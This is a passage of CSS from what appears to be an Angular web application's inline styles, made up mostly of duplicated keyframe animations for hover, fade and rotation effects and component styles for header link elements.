                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .rotherham[_ngcontent-c12] {
            margin-right: 10px;
            margin-left: 10px;
            position: relative
        }

        .rotherham-content-link[_ngcontent-c12]:hover {
            color: #fff
        }

        .rotherham-content[_ngcontent-c12] {
            color: #fff;
            position: relative;
            display: inline-block
        }

        .rotherham-content[_ngcontent-c12] i.rotherham-content-icon-mobile[_ngcontent-c12] {
            display: none;
            font-size: 19px;
            margin: 0 10px 4px
        }

        .rotherham-content-link-globe[_ngcontent-c12] {
            position: absolute;
            border-radius: 50%;
            width: 10px;
            height: 10px;
            display: none
        }

        .rotherham-content-link[_ngcontent-c12] {
            position: relative;
            z-index: 2;
            display: inline-block;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .rotherham-content[_ngcontent-c12] i[_ngcontent-c12] {
            color: #fff;
            font-size: 9px;
            display: inline-block;
            margin-left: 6px;
            margin-right: 12px;
            vertical-align: top;
            margin-top: 9px
        }

        .rotherham-content.z_index[_ngcontent-c12],
        .rotherham.z_index[_ngcontent-c12] {
            z-index: 999
        }

        .rotherham-content.z_index[_ngcontent-c12] .rotherham-content-link-background[_ngcontent-c12],
        .rotherham.z_index[_ngcontent-c12] .rotherham-content-link-background[_ngcontent-c12] {
            display: none
        }

        .rotherham-content[_ngcontent-c12]:hover {
            cursor: pointer
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .rotherham[_ngcontent-c12] {
                margin: -1px 8px 0 0;
                padding-top: 7px
            }

            .rotherham-content[_ngcontent-c12] {
                padding: 0
            }

            .rotherham[_ngcontent-c12] .rotherham-content-link-text[_ngcontent-c12],
            .rotherham[_ngcontent-c12] .rotherham-pipe-left[_ngcontent-c12],
            .rotherham[_ngcontent-c12] .rotherham-pipe-right[_ngcontent-c12],
            .rotherham-content-link-background[_ngcontent-c12] {
                display: none
            }

            .rotherham-content[_ngcontent-c12] i.rotherham-content-icon-mobile[_ngcontent-c12] {
                display: inline-block;
                margin: 0 4px 4px
            }

            .rotherham-content[_ngcontent-c12] i.rotherham-content-icon-arrow[_ngcontent-c12] {
                position: absolute;
                bottom: -4px;
                right: 5px;
                margin: 0;
                font-size: 7px
            }
        }

        .rotherham.noButtonMode[_ngcontent-c12] .rotherham-content[_ngcontent-c12] .rotherham-content-link[_ngcontent-c12] {
            display: none
        }

        .rotherham-content-link-text[_ngcontent-c12] {
            color: #fff;
            font-size: 14px;
            display: inline-block;
            vertical-align: top;
            padding-top: 2px;
            margin-left: 8px;
            margin-right: 8px;
            text-transform: uppercase
        }

        .rotherham-content[_ngcontent-c12]:hover .rotherham-content-link-background[_ngcontent-c12] {
            -webkit-animation: .1s rotherham-link-animated;
            animation: .1s rotherham-link-animated;
            height: 100%;
            top: 0;
            left: 0;
            width: 100%;
            background: rgba(0, 0, 0, .2)
        }

        @-webkit-keyframes rotherham-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes rotherham-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        .rotherham-content-link-background[_ngcontent-c12] {
            position: absolute;
            width: 80%;
            height: 80%;
            background: 0 0;
            top: 10%;
            left: 10%;
            -webkit-animation: .1s rotherham-link-animated-reverse;
            animation: .1s rotherham-link-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes rotherham-link-animated-reverse {
            0% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        @keyframes rotherham-link-animated-reverse {
            0% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        .rotherham.dashboardMode[_ngcontent-c12] {
            float: left;
            margin-left: 0;
            color: #333
        }

        .rotherham.dashboardMode[_ngcontent-c12] .rotherham-content[_ngcontent-c12] {
            display: none
        }

        .rotherham.dashboardMode[_ngcontent-c12] .rotherham-contact-mail[_ngcontent-c12] {
            color: #17d2dc;
            width: 40px;
            height: 40px;
            display: inline-block;
            line-height: 40px;
            vertical-align: middle;
            text-align: center;
            border: 1px solid transparent;
            cursor: pointer
        }

        .rotherham.dashboardMode[_ngcontent-c12] .rotherham-contact-mail[_ngcontent-c12] i[_ngcontent-c12] {
            font-size: 24px
        }

        .rotherham.dashboardMode[_ngcontent-c12] .rotherham-contact-mail[_ngcontent-c12]:hover {
            border: 1px solid transparent;
            color: #fff
        }

        .rotherham[_ngcontent-c12] .rotherham-contact-mail[_ngcontent-c12] {
            display: none
        }
    </style>
<style>
        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .crawley[_ngcontent-c13] {
            position: relative
        }

        .crawley-content-link-text[_ngcontent-c13] {
            color: #fff;
            font-size: 14px;
            display: inline-block;
            vertical-align: top;
            padding-top: 2px;
